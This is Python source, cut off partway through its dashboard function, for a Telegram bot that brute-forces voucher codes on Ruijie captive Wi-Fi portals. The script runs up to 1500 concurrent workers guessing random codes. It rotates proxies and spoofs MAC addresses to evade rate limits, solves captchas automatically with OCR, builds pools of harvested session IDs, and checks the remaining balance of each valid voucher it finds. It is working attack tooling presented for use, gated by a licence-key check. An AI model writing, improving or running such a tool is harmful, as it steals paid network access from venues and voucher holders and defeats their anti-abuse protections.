import asyncio
import aiohttp
import json
import time
import random
import string
import re
import os
import sys
import hashlib
import datetime
import requests
from urllib.parse import urlparse, parse_qs, urlencode, urljoin, urlunparse
import ddddocr
import telegram
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
from telegram.constants import ParseMode
from aiohttp_socks import ProxyConnector, ProxyType

# ═══════════════════════════════════════════════════════════
#                    ⚙️  CONFIGURATION
# ═══════════════════════════════════════════════════════════
GITHUB_OWNER = ''
GITHUB_REPO = ''
FILE_PATH = 'key.txt'
GITHUB_TOKEN = os.environ.get('GH_TOKEN', '')
LAST_RUN_FILE = 'last_run.txt'

# ═══════════════════════════════════════════════════════════
#                    👑  OWNER / ADMIN
# ═══════════════════════════════════════════════════════════
OWNER_NAME = "@bopaing_789"
ADMIN_NAME = "@bopaing_789"
ADMIN_IDS = [8363372270]
BOT_TOKEN = os.environ.get('BOT_TOKEN', '')

PORTAL_URL_PATH = 'portal_url_'
PROXY_FILE = 'proxies.txt'

TIMEOUT_SEC = 15
MAX_CODES_PER_SID = 60
MAX_CODES_PER_SESSION = 60
NUM_WORKERS = 1500

# ═══════════════════════════════════════════════════════════
#                    🧩  SID POOL SETTINGS
# ═══════════════════════════════════════════════════════════
TARGET_SIDS = 1000              # soft cap — များလေ ကောင်းလေ
MIN_SIDS = 100                  # အနည်းဆုံး ဒီအထိ အမြန် ဖြည့်
SID_BATCH_SIZE = 30             # batch တစ်ခုကို parallel ဖန်တီး
SID_FAIL_LIMIT = 20             # ဆက်တိုက် fail ရင် ခဏရပ်
SID_PAUSE_ON_FAIL = 30          # ရပ်ချိန် (စက္ကန့်)
SID_TTL = 120                   # SID သက်တမ်း (စက္ကန့်)

DIRECT = 'direct'
DIRECT_SLOTS = 10

bcyan = '\x1b[1;36m'
bgreen = '\x1b[1;32m'
bred = '\x1b[1;31m'
yellow = '\x1b[33m'
white = '\x1b[37m'
reset = '\x1b[0m'


# ═══════════════════════════════════════════════════════════
#                    🎨  BRANDING
# ═══════════════════════════════════════════════════════════
def show_banner():
    try:
        if os.name == 'posix' and os.environ.get('TERM'):
            os.system('clear')
        elif os.name == 'nt':
            os.system('cls')
    except Exception:
        pass
    print(bcyan + '=' * 58 + reset)
    print(bcyan + '   ⚡ RUIJIE  ASYNC EXTREME  ⚡   ' + reset)
    print(f'        Owner: {OWNER_NAME}')
    print(bcyan + '=' * 58 + reset)


def get_system_key():
    return 'dragon1'


def encrypt_key_data(key_str: str, expiry_str: str):
    combined = f'{key_str}|{expiry_str}'
    return hashlib.sha256(combined.encode()).hexdigest()


def check_time_integrity():
    now = datetime.datetime.now()
    if not os.path.exists(LAST_RUN_FILE):
        with open(LAST_RUN_FILE, 'w') as f:
            f.write(now.strftime('%Y-%m-%d %H:%M:%S'))
        return
    try:
        with open(LAST_RUN_FILE, 'r') as f:
            last_run_time = datetime.datetime.strptime(f.read().strip(), '%Y-%m-%d %H:%M:%S')
        if now < last_run_time:
            print(bred + '[!] ERROR: TIME ROLLBACK DETECTED! STOPPING...' + reset + '\n')
            os._exit(0)
    except Exception:
        with open(LAST_RUN_FILE, 'w') as f:
            f.write(now.strftime('%Y-%m-%d %H:%M:%S'))
    with open(LAST_RUN_FILE, 'w') as f:
        f.write(now.strftime('%Y-%m-%d %H:%M:%S'))


def display_remaining_time(expiry_date):
    now = datetime.datetime.now()
    remaining = expiry_date - now
    days = remaining.days
    hours, remainder = divmod(remaining.seconds, 3600)
    minutes, seconds = divmod(remainder, 60)
    time_str = f"{'' if days else ''}{days} days {hours} hour {minutes} min "
    print(bgreen + '[+] Access Granted!' + reset)
    print(yellow + '[*] Time left: ' + time_str +
          f"\n[-] Expired on ({expiry_date.strftime('%Y-%m-%d %H:%M')}) " + reset)
    print('==========================================================')


def check_approval():
    print(white + 'Checking authorization...' + reset + '\n')
    show_banner()
    check_time_integrity()
    now = datetime.datetime.now()
    github_url = f'https://api.github.com/repos/{GITHUB_OWNER}/{GITHUB_REPO}/contents/{FILE_PATH}'
    headers = {'Authorization': f'Bearer {GITHUB_TOKEN}',
               'Accept': 'application/vnd.github.v3.raw'}
    try:
        response = requests.get(github_url, headers=headers, timeout=7)
        if response.status_code != 200:
            print(bred + f'[!] License server unavailable (HTTP {response.status_code}). Running in OFFLINE mode.' + reset)
            return
    except requests.RequestException:
        print(bred + '[!] Cannot reach license server. Running in OFFLINE mode.' + reset)
        return

    my_key = get_system_key()
    lines = response.text.strip().split('\n')
    for line in lines:
        parts = line.split(',')
        if len(parts) < 2:
            continue
        if parts[0].strip().strip('"').strip("'") == my_key:
            expiry_str = parts[1].strip().strip('"').strip("'")
            expiry_date = datetime.datetime.strptime(expiry_str, '%Y-%m-%d %H:%M:%S')
            if now < expiry_date:
                display_remaining_time(expiry_date)
                return
            else:
                print(bred + f'[!] KEY EXPIRED ON SERVER!\n[+]Your key :{my_key}' + reset)
                os._exit(0)
    print(bred + f'[!] YOUR KEY IS NOT AUTHORIZED BY ADMIN!\n[+]Your key :{my_key}' + reset)
    os._exit(0)


# ═══════════════════════════════════════════════════════════
#                    🌐  API BASE
# ═══════════════════════════════════════════════════════════
def get_api_base(portal_url: str) -> str:
    if not portal_url:
        return 'https://portal-as.ruijienetworks.com'
    try:
        u = urlparse(portal_url)
        if u.scheme and u.netloc:
            return f"{u.scheme}://{u.netloc}"
    except Exception:
        pass
    return 'https://portal-as.ruijienetworks.com'


def build_api_urls(portal_url: str):
    base = get_api_base(portal_url)
    return (
        f'{base}/api/auth/voucher/?lang=en_US',
        f'{base}/api/auth/captcha/image',
        f'{base}/api/auth/captcha/verify',
        f'{base}/api/auth/balance/getBalance',
    )


# ═══════════════════════════════════════════════════════════
#                    🔀  PROXY MANAGER
# ═══════════════════════════════════════════════════════════
class ProxyManager:
    def __init__(self, file_path: str):
        self.file_path = file_path
        self.proxies = []
        self.bad_proxies = set()
        self.cooldown = {}
        self.index = 0
        self.lock = asyncio.Lock()
        self.load()

    def _normalize(self, proxy: str) -> 'str | None':
        proxy = (proxy or '').strip()
        if not proxy or proxy.startswith('#'):
            return None
        proxy = proxy.split()[0]
        if not proxy.startswith(('http://', 'https://', 'socks4://', 'socks5://')):
            return 'http://' + proxy
        return proxy

    def load(self):
        try:
            if os.path.exists(self.file_path):
                with open(self.file_path, 'r') as f:
                    raw = f.read()
                self.proxies.clear()
                self.bad_proxies.clear()
                self.index = 0
                seen = set()
                for r in raw.splitlines():
                    p = self._normalize(r)
                    if p and p not in seen:
                        seen.add(p)
                        self.proxies.append(p)
                self.proxies.extend([DIRECT] * DIRECT_SLOTS)
                print(f'[ProxyManager] Loaded {len(self.proxies)} endpoints ({DIRECT_SLOTS} direct)')
        except Exception as e:
            print(f'[ProxyManager] Load error: {e}')

    def reload(self):
        self.load()

    async def get_next(self) -> 'str | None':
        now = time.time()
        available = [p for p in self.proxies
                     if p not in self.bad_proxies and self.cooldown.get(p, 0) <= now]
        if not available:
            return None
        proxy = available[self.index % len(available)]
        self.index += 1
        return proxy

    async def mark_limited(self, proxy: str, seconds: float = 30.0):
        if proxy == DIRECT:
            return
        async with self.lock:
            self.cooldown[proxy] = time.time() + seconds

    async def mark_bad(self, proxy: str):
        async with self.lock:
            self.bad_proxies.add(proxy)

    async def reset(self):
        async with self.lock:
            self.bad_proxies.clear()
            self.cooldown.clear()
            self.index = 0

    def stats(self) -> 'tuple[int, int]':
        total = len(self.proxies)
        now = time.time()
        active = sum(1 for p in self.proxies
                     if p not in self.bad_proxies and self.cooldown.get(p, 0) <= now)
        return total, active


_proxy_manager = None


def get_proxy_manager():
    global _proxy_manager
    if _proxy_manager is None:
        _proxy_manager = ProxyManager(PROXY_FILE)
    return _proxy_manager


_ocr_instance = None


def get_ocr_instance():
    global _ocr_instance
    if _ocr_instance is None:
        _ocr_instance = ddddocr.DdddOcr(show_ad=False)
    return _ocr_instance


user_scanners = {}


def get_user_data(user_id: int):
    if user_id not in user_scanners:
        saved_url = None
        if os.path.exists(FILE_PATH):
            with open(FILE_PATH, 'r') as f:
                for line in f.read().strip().splitlines():
                    if line.startswith(PORTAL_URL_PATH + str(user_id) + ' '):
                        saved_url = line.split(' ', 1)[1].strip()
                        break
        user_scanners[user_id] = {
            'mode': 'num6',
            'char_set': '012345678',
            'code_len': 6,
            'start_digit': None,
            'end_digit': None,
            'portal_url': saved_url,
            'stop_event': asyncio.Event(),
            'dash_update_event': asyncio.Event(),
            'task': None,
            'stats': {'tried': 0, 'hits': 0, 'expired': 0, 'limits': 0, 'start_time': time.time()},
            'valid_codes': [],
            'limit_codes': [],
            'tried_codes': set(),
            'recent_logs': [],
            'recheck_queue': [],
            'CURRENT_CODE': '----',
            'dash_msg_id': None,
            'dash_task': None,
            'tasks': [],
            'menu_msg_id': None,
            'state': None,
            'sid_pool': [],
            'sid_time': {},
            'sid_auth': {},
            'sid_lock': asyncio.Lock(),
            'sid_created': 0,
        }
    return user_scanners[user_id]


def generate_random_mac():
    return ':'.join('%02x' % random.randint(0, 255) for _ in range(6))


def ocr_image_bytes_fast(image_bytes: bytes) -> str:
    ocr = get_ocr_instance()
    result = ocr.classification(image_bytes)
    return result.strip().upper()


async def solve_captcha_simple_async(session, captcha_url, headers):
    current_url = f"{captcha_url}&_t={int(time.time() * 1000)}"
    async with session.get(current_url, headers=headers, ssl=False,
                           timeout=aiohttp.ClientTimeout(total=10)) as response:
        if response.status == 200:
            image_content = await response.read()
            return await asyncio.to_thread(ocr_image_bytes_fast, image_content)
        return ''


# ═══════════════════════════════════════════════════════════
#                    🧩  SID EXTRACTION (Auto)
# ═══════════════════════════════════════════════════════════
_SID_PATTERNS = [
    r'sessionId["\']?\s*[:=]\s*["\']?([A-Za-z0-9_-]{6,})',
    r'["\']sessionId["\']\s*:\s*["\']([^"\']{6,})["\']',
    r'session_id["\']?\s*[:=]\s*["\']?([A-Za-z0-9_-]{6,})',
    r'sessionId=([A-Za-z0-9_-]{6,})',
    r'var\s+sessionId\s*=\s*["\']([^"\']{6,})["\']',
    r'sid["\']?\s*[:=]\s*["\']?([A-Za-z0-9_-]{12,})',
]


def _extract_sid_from_text(text: str):
    if not text:
        return None
    for pat in _SID_PATTERNS:
        m = re.search(pat, text, re.I)
        if m:
            return m.group(1)
    return None


def _extract_sid_from_cookies(cookie_jar):
    try:
        for c in cookie_jar:
            key = c.key.lower()
            if key in ('sessionid', 'session_id', 'sid', 'jsessionid'):
                if c.value and len(c.value) > 5:
                    return c.value
    except Exception:
        pass
    return None


def _extract_sid_from_json(data):
    if not isinstance(data, dict):
        return None
    for k in ('sessionId', 'session_id', 'sid', 'SessionId', 'SESSIONID'):
        v = data.get(k)
        if isinstance(v, str) and len(v) > 5:
            return v
        if isinstance(v, dict):
            inner = _extract_sid_from_json(v)
            if inner:
                return inner
    for v in data.values():
        if isinstance(v, dict):
            inner = _extract_sid_from_json(v)
            if inner:
                return inner
        if isinstance(v, list):
            for item in v:
                if isinstance(item, dict):
                    inner = _extract_sid_from_json(item)
                    if inner:
                        return inner
    return None


def _extract_redirect_target(body: str, base_url: str):
    for pat in (
        r"location\.href\s*=\s*['\"]([^'\"]+)['\"]",
        r"location\.replace\s*\(\s*['\"]([^'\"]+)['\"]",
        r"window\.location\s*=\s*['\"]([^'\"]+)['\"]",
        r"<meta[^>]+http-equiv=['\"]refresh['\"][^>]+url=([^'\">]+)",
        r"url\s*[:=]\s*['\"]([^'\"]*index\.html[^'\"]*)['\"]",
        r"['\"]([^'\"]*\/download\/static\/maccauth[^'\"]*)['\"]",
    ):
        m = re.search(pat, body, re.I)
        if m:
            return urljoin(base_url, m.group(1).strip())
    return None


async def _try_get_sid(session, url, headers, ud):
    try:
        async with session.get(url, headers=headers, timeout=TIMEOUT_SEC,
                               ssl=False, allow_redirects=True) as r:
            sid = parse_qs(urlparse(str(r.url)).query).get('sessionId', [None])[0]
            if sid:
                return sid

            sid = _extract_sid_from_cookies(session.cookie_jar)
            if sid:
                return sid

            body = await r.text()
            sid = _extract_sid_from_text(body)
            if sid:
                return sid

            target = _extract_redirect_target(body, str(r.url))
            if target and target != str(r.url):
                try:
                    async with session.get(target, headers=headers, timeout=TIMEOUT_SEC,
                                           ssl=False, allow_redirects=True) as r2:
                        sid = parse_qs(urlparse(str(r2.url)).query).get('sessionId', [None])[0]
                        if sid:
                            return sid
                        sid = _extract_sid_from_cookies(session.cookie_jar)
                        if sid:
                            return sid
                        body2 = await r2.text()
                        sid = _extract_sid_from_text(body2)
                        if sid:
                            return sid
                except Exception:
                    pass

            try:
                data = json.loads(body)
                sid = _extract_sid_from_json(data)
                if sid:
                    return sid
            except Exception:
                pass
    except Exception as e:
        ud['recent_logs'].append(f"⚠️ GET: {type(e).__name__}")
    return None


async def _try_post_sid(session, url, payload, headers, ud):
    try:
        async with session.post(url, json=payload, headers=headers,
                                timeout=TIMEOUT_SEC, ssl=False,
                                allow_redirects=True) as r:
            sid = _extract_sid_from_cookies(session.cookie_jar)
            if sid:
                return sid

            body = await r.text()

            try:
                data = json.loads(body)
                sid = _extract_sid_from_json(data)
                if sid:
                    return sid
            except Exception:
                pass

            sid = _extract_sid_from_text(body)
            if sid:
                return sid

            sid = parse_qs(urlparse(str(r.url)).query).get('sessionId', [None])[0]
            if sid:
                return sid
    except Exception as e:
        ud['recent_logs'].append(f"⚠️ POST: {type(e).__name__}")
    return None


async def get_sid_from_gateway(session, portal_url, user_id):
    """Auto-detect sessionId from ANY Ruijie URL."""
    ud = get_user_data(user_id)

    existing = parse_qs(urlparse(portal_url).query).get('sessionId', [None])[0]
    if existing:
        return existing

    parsed = urlparse(portal_url)
    base = f"{parsed.scheme}://{parsed.netloc}"
    params = {k: v[0] for k, v in parse_qs(parsed.query).items()}

    headers_mobile = {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Mobile Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9',
    }
    headers_json = {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Mobile Safari/537.36',
        'Accept': 'application/json, text/plain, */*',
        'Content-Type': 'application/json',
        'Origin': base,
        'Referer': f'{base}/download/static/maccauth/src/index.html',
    }

    sid = await _try_get_sid(session, portal_url, headers_mobile, ud)
    if sid:
        return sid

    if 'mac' in params:
        try:
            q2 = dict(params)
            q2['mac'] = generate_random_mac()
            u2 = urlunparse(parsed._replace(query=urlencode(q2)))
            sid = await _try_get_sid(session, u2, headers_mobile, ud)
            if sid:
                return sid
        except Exception:
            pass

    try:
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        sid = await _try_get_sid(session, base_url, headers_mobile, ud)
        if sid:
            return sid
    except Exception:
        pass

    if 'wifidog' in portal_url:
        for stage in ('portal', 'auth'):
            payload = dict(params)
            payload['stage'] = stage
            sid = await _try_post_sid(session, f'{base}/api/auth/wifidog',
                                      payload, headers_json, ud)
            if sid:
                return sid

    if 'wifidog' in portal_url:
        try:
            form = dict(params)
            form['stage'] = 'portal'
            async with session.post(f'{base}/api/auth/wifidog', data=form,
                                    headers=headers_mobile, timeout=TIMEOUT_SEC,
                                    ssl=False, allow_redirects=True) as r:
                body = await r.text()
                sid = _extract_sid_from_text(body)
                if sid:
                    return sid
                try:
                    data = json.loads(body)
                    sid = _extract_sid_from_json(data)
                    if sid:
                        return sid
                except Exception:
                    pass
        except Exception:
            pass

    init_paths = [
        '/api/auth/session/init',
        '/api/auth/session',
        '/api/auth/wifidog/init',
        '/api/auth/getSessionId',
        '/api/auth/createSession',
        '/api/auth/portal',
        '/api/auth/init',
    ]
    for path in init_paths:
        try:
            sid = await _try_post_sid(session, f'{base}{path}', params, headers_json, ud)
            if sid:
                return sid
        except Exception:
            pass

    for path in init_paths:
        try:
            url = f'{base}{path}?' + urlencode(params)
            sid = await _try_get_sid(session, url, headers_json, ud)
            if sid:
                return sid
        except Exception:
            pass

    ud['recent_logs'].append("⚠️ SID: all methods failed")
    return None


def create_connector_for_proxy(proxy: str):
    if proxy and proxy != DIRECT:
        return ProxyConnector.from_url(proxy, ssl=False)
    return None


# ═══════════════════════════════════════════════════════════
#                    💰  BALANCE
# ═══════════════════════════════════════════════════════════
async def fetch_balance(logon_url: str, code: str, proxy: str, orig_sid: str = None,
                        balance_base: str = None) -> str:
    candidates = []
    if logon_url:
        m = re.search(r'sessionId=([^&\s]+)', logon_url)
        if m:
            candidates.append(m.group(1))
    if orig_sid and orig_sid not in candidates:
        candidates.append(orig_sid)
    if not candidates:
        candidates.append(code)
    if not balance_base:
        balance_base = 'https://portal-as.ruijienetworks.com/api/auth/balance/getBalance'

    connector = create_connector_for_proxy(proxy)
    async with aiohttp.ClientSession(connector=connector) as s:
        last = ''
        for target in candidates:
            headers = {
                'accept': 'application/json, text/javascript, */*; q=0.01',
                'accept-language': 'en-US,en;q=0.9',
                'content-type': 'application/json;',
                'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
                'x-requested-with': 'XMLHttpRequest',
            }
            url = balance_base + '/' + target
            try:
                async with s.get(url, headers=headers, timeout=10) as resp:
                    if resp.status != 200:
                        last = f"\u274c HTTP {resp.status}"
                        continue
                    try:
                        data = await resp.json()
                    except Exception:
                        last = "\u274c bad json"
                        continue
                    inner = data.get('result')
                    if inner is None:
                        last = f"\u274c {str(data.get('message'))[:40]}"
                        continue
                    profile_name = inner.get('profileName', 'N/A')
                    raw_total = inner.get('totalMinutes', 0)
                    total_minutes = int(raw_total) if raw_total else 0
                    hours, minutes = divmod(total_minutes, 60)
                    return f"\U0001f525: {profile_name}, \u23f0: {hours} hr {minutes} min"
            except Exception as e:
                last = f"\u274c {type(e).__name__}"
        return last


async def check_balance(logon_url, code, user_id, proxy_str, orig_sid=None, balance_base=None):
    ud = get_user_data(user_id)
    balance_str = await fetch_balance(logon_url, code, proxy_str, orig_sid, balance_base)
    for item in ud['valid_codes']:
        if item['code'] == code:
            item['balance_str'] = balance_str
            break
    return balance_str


# ═══════════════════════════════════════════════════════════
#                    🎫  VOUCHER CHECK
# ═══════════════════════════════════════════════════════════
async def check_single_access_code(session, code, current_session_id, login_url,
                                    captcha_base_url, verify_url, headers, user_id,
                                    current_proxy, auth_code=None, balance_base=None):
    ud = get_user_data(user_id)

    async def submit(ac=None):
        payload = {'accessCode': code, 'sessionId': current_session_id, 'apiVersion': 1}
        if ac:
            payload['authCode'] = ac
        async with session.post(login_url, json=payload, headers=headers, ssl=False,
                                timeout=aiohttp.ClientTimeout(total=10)) as resp:
            try:
                return await resp.json()
            except Exception:
                try:
                    txt = await resp.text()
                except Exception:
                    txt = ''
                if 'limit' in txt.lower():
                    return {'__ratelimited__': True}
                return {}

    def handle(data):
        if not isinstance(data, dict) or not data:
            return {'status': 'failed', 'code': code}
        if data.get('__ratelimited__'):
            ud['stats']['limits'] += 1
            return {'status': 'limit', 'code': code}
        success = data.get('success')
        if success == 1 or success is True:
            result = data.get('result') or {}
            if str(result.get('authResult')) == '1':
                ud['stats']['hits'] += 1
                hit = {'code': code, 'balance_str': '...fetching...'}
                ud['valid_codes'].append(hit)
                ud['dash_update_event'].set()
                logon = result.get('logonUrl', '') or ''
                asyncio.create_task(check_balance(logon, code, user_id, current_proxy,
                                                  current_session_id, balance_base))
                return {'status': 'hit', 'code': code}
            ud['stats']['expired'] += 1
            return {'status': 'expired', 'code': code}
        obj = data.get('object') or {}
        if obj.get('checkCaptcha'):
            return {'status': 'captcha', 'code': code}
        msg = str(data.get('message', '')).lower()
        if 'limit' in msg or 'exceed' in msg or 'max' in msg or 'limited' in msg:
            ud['stats']['limits'] += 1
            ud['limit_codes'].append(code)
            return {'status': 'limit', 'code': code}
        ud['stats']['tried'] += 1
        return {'status': 'failed', 'code': code}

    try:
        data = await submit(auth_code)
    except Exception:
        return {'status': 'failed', 'code': code}

    res = handle(data)
    if res['status'] != 'captcha':
        res['auth_code'] = auth_code
        return res

    captcha_url = captcha_base_url + '?sessionId=' + current_session_id
    for _ in range(3):
        new_code = await solve_captcha_simple_async(session, captcha_url, headers)
        if not new_code:
            continue
        try:
            async with session.post(verify_url, json={'sessionId': current_session_id, 'authCode': new_code},
                                    headers=headers, ssl=False,
                                    timeout=aiohttp.ClientTimeout(total=10)) as v_resp:
                v_data = await v_resp.json()
        except Exception:
            v_data = {}
        if not (isinstance(v_data, dict) and v_data.get('success')):
            continue
        try:
            data2 = await submit(new_code)
        except Exception:
            continue
        res2 = handle(data2)
        if res2['status'] != 'captcha':
            res2['auth_code'] = new_code
            return res2
    ud['stats']['tried'] += 1
    return {'status': 'failed', 'code': code, 'auth_code': auth_code}


# ═══════════════════════════════════════════════════════════
#                    ❤️  PROXY HEALTH
# ═══════════════════════════════════════════════════════════
async def proxy_health_check(user_id, once=False):
    pm = get_proxy_manager()
    ud = get_user_data(user_id)
    base = get_api_base(ud.get('portal_url') or '')
    ping_url = f'{base}/api/auth/captcha/image?sessionId=healthcheck'
    headers = {'User-Agent': 'Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 Chrome/148.0.0.0 Mobile Safari/537.36'}

    async def check(p):
        if p == DIRECT:
            return (p, True)
        try:
            conn = ProxyConnector.from_url(p, ssl=False)
            async with aiohttp.ClientSession(connector=conn) as s:
                async with s.get(ping_url, headers=headers, timeout=6, ssl=False) as r:
                    await r.read()
                    return (p, True)
        except Exception:
            return (p, False)

    while True:
        proxies = list(pm.proxies)
        if proxies:
            results = await asyncio.gather(*[check(p) for p in proxies])
            async with pm.lock:
                for p, ok in results:
                    if ok:
                        pm.bad_proxies.discard(p)
                    else:
                        pm.bad_proxies.add(p)
        if once or ud['stop_event'].is_set():
            return
        await asyncio.sleep(60)


# ═══════════════════════════════════════════════════════════
#          🔁  SID REFRESHER — UNLIMITED + ADAPTIVE
# ═══════════════════════════════════════════════════════════
async def sid_refresher(context, user_id):
    """
    Adaptive SID refresher:
      - ကြာရင် ကြာသလောက် SID များများ ဖန်တီး (TARGET_SIDS ထိ = 1000)
      - Server refuse လုပ်ရင် ခဏရပ်
      - Rate-limit ခံရရင် backoff
    """
    ud = get_user_data(user_id)
    pm = get_proxy_manager()
    base = get_api_base(ud.get('portal_url') or '')
    headers = {'User-Agent': 'Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Mobile Safari/537.36',
               'Content-Type': 'application/json',
               'Origin': base}

    consecutive_fail = 0
    last_notify = time.time()

    async def make_sid():
        nonlocal consecutive_fail, last_notify
        for attempt in range(4):
            proxy = DIRECT if attempt == 0 else await pm.get_next()
            if proxy is None:
                continue
            session = aiohttp.ClientSession(
                connector=create_connector_for_proxy(proxy),
                connector_owner=True,
                timeout=aiohttp.ClientTimeout(total=15))
            try:
                sid = await get_sid_from_gateway(session, ud['portal_url'], user_id)
                if not sid:
                    consecutive_fail += 1
                    continue

                # pre-verify captcha
                captcha_base = f'{base}/api/auth/captcha/image'
                verify_url = f'{base}/api/auth/captcha/verify'
                auth = None
                captcha_url = captcha_base + '?sessionId=' + sid
                for _ in range(3):
                    code = await solve_captcha_simple_async(session, captcha_url, headers)
                    if not code:
                        continue
                    try:
                        async with session.post(verify_url,
                                                json={'sessionId': sid, 'authCode': code},
                                                headers=headers, ssl=False) as vr:
                            vd = await vr.json()
                    except Exception:
                        vd = {}
                    if isinstance(vd, dict) and vd.get('success'):
                        auth = code
                        break

                async with ud['sid_lock']:
                    if sid not in ud['sid_pool']:
                        ud['sid_pool'].append(sid)
                        ud['sid_time'][sid] = time.time()
                        ud['sid_created'] = ud.get('sid_created', 0) + 1
                        consecutive_fail = 0
                        pool_size = len(ud['sid_pool'])
                    if auth:
                        ud['sid_auth'][sid] = auth

                # Log every 25 SIDs
                created = ud.get('sid_created', 0)
                if created > 0 and created % 25 == 0:
                    print(f"[SID] 📈 Total created: {created}, pool={len(ud['sid_pool'])}")

                # Notify dashboard (throttled to every 3 sec)
                now = time.time()
                if now - last_notify > 3:
                    last_notify = now
                    ud['dash_update_event'].set()
                return
            except Exception as e:
                consecutive_fail += 1
                print(f"[SID] error ({type(e).__name__}): {e}")
                continue
            finally:
                try:
                    await session.close()
                except Exception:
                    pass
        return

    print(f"[SID] Refresher started — target={TARGET_SIDS}, min={MIN_SIDS}, batch={SID_BATCH_SIZE}")

    while not ud['stop_event'].is_set():
        try:
            if ud['portal_url'] is None:
                await asyncio.sleep(0.5)
                continue

            now = time.time()
            async with ud['sid_lock']:
                # prune expired
                fresh = []
                for s in ud['sid_pool']:
                    if now - ud['sid_time'].get(s, 0) < SID_TTL:
                        fresh.append(s)
                    else:
                        ud['sid_auth'].pop(s, None)
                        ud['sid_time'].pop(s, None)
                ud['sid_pool'] = fresh
                pool_size = len(ud['sid_pool'])

            # Reached target
            if pool_size >= TARGET_SIDS:
                await asyncio.sleep(3)
                continue

            # Too many fails — pause
            if consecutive_fail >= SID_FAIL_LIMIT:
                print(f"[SID] ⚠️ {consecutive_fail} consecutive fails — pausing {SID_PAUSE_ON_FAIL}s")
                await asyncio.sleep(SID_PAUSE_ON_FAIL)
                consecutive_fail = 0
                continue

            # Dynamic batch
            need = TARGET_SIDS - pool_size
            batch = min(need, SID_BATCH_SIZE)

            # Boost if pool too low
            if pool_size < MIN_SIDS:
                batch = min(need, SID_BATCH_SIZE * 2)

            # If pool is empty (first run), go aggressive
            if pool_size == 0:
                batch = min(need, SID_BATCH_SIZE * 3)

            await asyncio.gather(*[make_sid() for _ in range(batch)],
                                 return_exceptions=True)

            # Small delay between batches (avoid hammering server)
            await asyncio.sleep(0.5)

        except Exception as e:
            print(f"[SID refresher] error: {e}")
            await asyncio.sleep(2)
    print("[SID] Refresher stopped")
    return


# ═══════════════════════════════════════════════════════════
#                    👷  WORKER
# ═══════════════════════════════════════════════════════════
async def worker(worker_id, login_url, captcha_base_url, verify_url, headers, user_id, balance_base):
    ud = get_user_data(user_id)
    pm = get_proxy_manager()
    session = None
    proxy = None
    while not ud['stop_event'].is_set():
        if session is None:
            proxy = await pm.get_next()
            if not proxy:
                await asyncio.sleep(0.3)
                continue
            session = aiohttp.ClientSession(connector=create_connector_for_proxy(proxy), connector_owner=True)
        pool = ud['sid_pool']
        sid = random.choice(pool) if pool else None
        if not sid:
            await asyncio.sleep(0.2)
            continue
        auth_code = ud['sid_auth'].get(sid)
        mode = ud['mode']
        if mode == 'custom' and ud['start_digit']:
            code = ud['start_digit'] + ''.join(random.choices(ud['char_set'], k=ud['code_len'] - 1))
        elif mode == 'customend' and ud.get('end_digit'):
            code = ''.join(random.choices(ud['char_set'], k=ud['code_len'] - 1)) + ud['end_digit']
        else:
            code = ''.join(random.choices(ud['char_set'], k=ud['code_len']))
        if code in ud['tried_codes']:
            continue
        ud['tried_codes'].add(code)
        ud['CURRENT_CODE'] = code
        try:
            result = await check_single_access_code(session, code, sid, login_url,
                                                     captcha_base_url, verify_url,
                                                     headers, user_id, proxy,
                                                     auth_code, balance_base)
        except Exception:
            result = {'status': 'failed', 'code': code}
        if result.get('auth_code'):
            ud['sid_auth'][sid] = result['auth_code']
        if result['status'] == 'hit':
            ud['recent_logs'].append(f"\u2705 HIT: {code} | " + str(next((item.get('balance_str', ' ') for item in ud['valid_codes'] if item['code'] == code), ' ')))
        elif result['status'] == 'limit':
            await pm.mark_limited(proxy, 30.0)
            try:
                await session.close()
            except Exception:
                pass
            session = None
            proxy = None
    if session is not None:
        try:
            await session.close()
        except Exception:
            pass
    return


# ═══════════════════════════════════════════════════════════
#                    📊  DASHBOARD (with progress bar)
# ═══════════════════════════════════════════════════════════
async def live_dashboard_updater(context: ContextTypes.DEFAULT_TYPE, user_id: int):
    """Live dashboard with SID progress bar, timeout handling & fallback."""
    ud = get_user_data(user_id)
    pm = get_proxy_manager()
    consecutive_fails = 0
    while not ud['stop_event'].is_set():
        if ud['dash_msg_id'] is None:
            await asyncio.sleep(0.5)
            continue
        stats = ud['stats']
        elapsed = max(time.time() - stats['start_time'], 0) or 1
        speed_cpm = stats['tried'] * 60 / elapsed
        proxy_total, proxy_active = pm.stats()
        pool_size = len(ud['sid_pool'])

        # SID Progress bar
        progress_pct = min(100, int((pool_size / TARGET_SIDS) * 100))
        bar_len = 20
        filled = int(bar_len * pool_size / TARGET_SIDS)
        bar = "█" * filled + "░" * (bar_len - filled)

        hit_list = []
        for item in ud['valid_codes']:
            hit_list.append(f"{item['code']} {item.get('balance_str', '...fetching...')}")

        text = (f"⚡ Scanner Running ⚡\n"
                f"👑 Owner: {OWNER_NAME}"
                f"\n━━━━━━━━━━━━━━━━━━\n"
                f"🏹 Tried: {stats['tried']}"
                f"\n🎯 Current Code: {ud['CURRENT_CODE']}"
                f"\n⚔️ Expired: {stats['expired']}"
                f"\n🔥 Hits: {stats['hits']}"
                f"\n⚠️ Limits: {stats['limits']}"
                f"\n⚡ Speed: {speed_cpm:.1f} c/m"
                f"\n🔀 Proxies: {proxy_active}/{proxy_total}"
                f"\n🧩 SID Pool: {pool_size}/{TARGET_SIDS}"
                f"\n   [{bar}] {progress_pct}%")

        if pool_size == 0:
            text += "\n\n⚠️ SID pool ရှာနေသည်..."

        if hit_list:
            text += "\n━━━━━━━━━━━━━━━━━━\n🔥 **Hit Codes**:\n" + "\n".join(hit_list)
        else:
            text += "\n━━━━━━━━━━━━━━━━━━\n🔥 **Hit Codes**: None yet"

        last_log = ud['recent_logs'][-1] if ud['recent_logs'] else 'None'
